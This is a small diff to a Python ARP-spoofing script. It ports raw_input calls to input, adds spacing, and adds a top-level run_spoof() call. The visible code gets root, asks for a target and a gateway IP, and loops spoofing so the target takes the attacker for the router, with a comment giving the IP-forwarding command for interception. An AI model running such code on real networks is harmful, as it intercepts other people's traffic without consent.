@@ -3,6 +3,7 @@ import os
 import sys
 import time
 
+
 def become_root():
     euid = os.geteuid()
     if euid != 0:
@@ -51,11 +52,13 @@ def restore(destination_ip, source_ip):
 
 #  sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 sent_packets = 0
+
+
 def run_spoof():
     global sent_packets
     become_root()
-    target_ip = raw_input("Enter the target ip you want to spoof: ")
-    gateway_ip = raw_input("\nEnter the IP address of the Gateway: ")
+    target_ip = input("Enter the target ip you want to spoof: ")
+    gateway_ip = input("\nEnter the IP address of the Gateway: ")
     try:
         while True:
             spoof(target_ip, gateway_ip)  # Tell the target that we are the router
@@ -69,3 +72,5 @@ def run_spoof():
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
 
+
+run_spoof()
